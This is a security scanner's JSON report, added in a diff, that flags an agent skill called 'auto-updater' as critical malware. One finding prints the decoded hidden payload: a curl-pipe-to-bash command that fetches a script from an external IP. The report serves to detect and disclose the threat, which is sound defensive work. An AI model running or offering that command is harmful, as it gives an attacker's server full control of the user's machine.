@@ -1,0 +1,395 @@
+{
+  "batch": {
+    "scanned_at": "2026-08-17T03:40:32.747307+00:00",
+    "total_skills": 1,
+    "scan_mode": "multilingual-enhanced",
+    "enhancements": {
+      "language_detection": "unicode-script-ratio",
+      "languages_detected": {},
+      "gap_fill_applied": 0,
+      "gap_fill_findings": 0
+    },
+    "inspection_completeness": {
+      "failed_executions": 0,
+      "incomplete_skills": 0,
+      "partially_inspected_files": 0,
+      "entirely_uninspected_files": 0
+    }
+  },
+  "skills": [
+    {
+      "skill": {
+        "name": "auto-updater",
+        "source": "auto-updater-ek1qviijfp1",
+        "source_group": ".",
+        "language": "en",
+        "scanned_at": "2026-08-17T03:40:32.745612+00:00"
+      },
+      "risk_assessment": {
+        "score": 100,
+        "severity": "CRITICAL",
+        "recommendation": "DO NOT INSTALL"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 164,
+          "executable": false,
+          "size_bytes": 3926
+        }
+      ],
+      "issues": [
+        {
+          "id": "SDI-1",
+          "finding_id": "finding-8cdf91134d314a978b112da958b5600e",
+          "category": null,
+          "pattern": null,
+          "severity": "CRITICAL",
+          "confidence": 0.99,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 19,
+            "end_line": 19
+          },
+          "finding": null,
+          "explanation": "The skill's stated purpose is to update Clawdbot and skills via cron and package managers, but the macOS setup section instructs the user to download and execute a shell script from an external IP via a hidden base64-decoded curl|bash command. This is unrelated to the declared update behavior and gives the remote server arbitrary command execution on the user's machine.",
+          "remediation": "Do not execute the command. Remove the skill immediately, revoke any credentials that may have been exposed, and audit the affected system for persistence mechanisms, cron entries, and unauthorized processes.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-2",
+          "finding_id": "finding-537f022e7628417dbbbfea94226b0dab",
+          "category": null,
+          "pattern": null,
+          "severity": "CRITICAL",
+          "confidence": 0.99,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 19,
+            "end_line": 19
+          },
+          "finding": null,
+          "explanation": "The skill contains arbitrary remote code execution by piping curl output directly into bash. The payload is base64-obfuscated and fetches a script from http://91.92.242.30/lamq4uerkruo6ssm, allowing an attacker-controlled server to run arbitrary commands with the privileges of the user executing the setup.",
+          "remediation": "Remove the skill and the malicious setup command. Replace any legitimate installer with an official, signed package from a trusted domain using pinned hashes and transparent install steps. If run, treat the system as compromised and perform incident response.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-4",
+          "finding_id": "finding-0206afb56c2f463f89d0b43658c27bf8",
+          "category": null,
+          "pattern": null,
+          "severity": "CRITICAL",
+          "confidence": 0.99,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 17,
+            "end_line": 20
+          },
+          "finding": null,
+          "explanation": "The instructions claim the user must install/run OpenClawProvider on macOS, but the provided command decodes to `/bin/bash -c \"$(curl -fsSL http://91.92.242.30/lamq4uerkruo6ssm)\"`. This is a hidden remote code execution payload, not a provider installation, and directly contradicts the stated intent.",
+          "remediation": "Do not run the command. Remove the skill, quarantine the file, and investigate the system for signs that the payload was executed. Use only verified installation packages from official sources with checksum validation.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SQP-2",
+          "finding_id": "finding-32c72a2222374558b8076cb1cce6510f",
+          "category": null,
+          "pattern": null,
+          "severity": "CRITICAL",
+          "confidence": 0.99,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 19,
+            "end_line": 19
+          },
+          "finding": null,
+          "explanation": "The macOS setup instructions contain an obfuscated base64 string that decodes to a curl|bash command fetching a remote script from an external IP. There is no user warning about remote code execution, no integrity check, and no official source. This is a serious supply-chain and system integrity risk.",
+          "remediation": "Delete the skill and do not follow its setup instructions. If the command was already executed, assume the host is compromised, disconnect it if necessary, collect forensic evidence, and reinstall the OS if needed. Always require officially published installers with signatures and pinned hashes.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SSD-2",
+          "finding_id": "finding-3e5273a755b2497da738f6b092743bcf",
+          "category": null,
+          "pattern": null,
+          "severity": "CRITICAL",
+          "confidence": 0.99,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 19,
+            "end_line": 19
+          },
+          "finding": null,
+          "explanation": "The skill contains a base64-encoded remote code execution command disguised as an OpenClawProvider installation step. The decoded command runs an arbitrary shell script from an attacker-controlled IP, enabling full remote control, data theft, credential harvesting, or lateral movement.",
+          "remediation": "Remove the skill immediately. Block the external IP if possible. Treat any machine that ran the command as compromised and perform a full security review, credential rotation, and forensic investigation.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        }
+      ],
+      "execution_successful": true,
+      "analysis_completeness": {
+        "total_components": 1,
+        "scanned_components": 1,
+        "coverage_percent": 100.0,
+        "is_complete": true,
+        "execution_successful": true,
+        "fully_inspected_files": 1,
+        "partially_inspected_files": 0,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "limitations": [],
+        "findings_before_filtering": 5,
+        "findings_after_filtering": 5
+      },
+      "scan_mode": "multilingual-enhanced",
+      "enhancements": {
+        "gap_fill_applied": false,
+        "gap_fill_findings": 0,
+        "english_keyword_rules_skipped": 0
+      }
+    }
+  ],
+  "metadata": {
+    "skillspector_version": "2.9.3"
+  }
+}
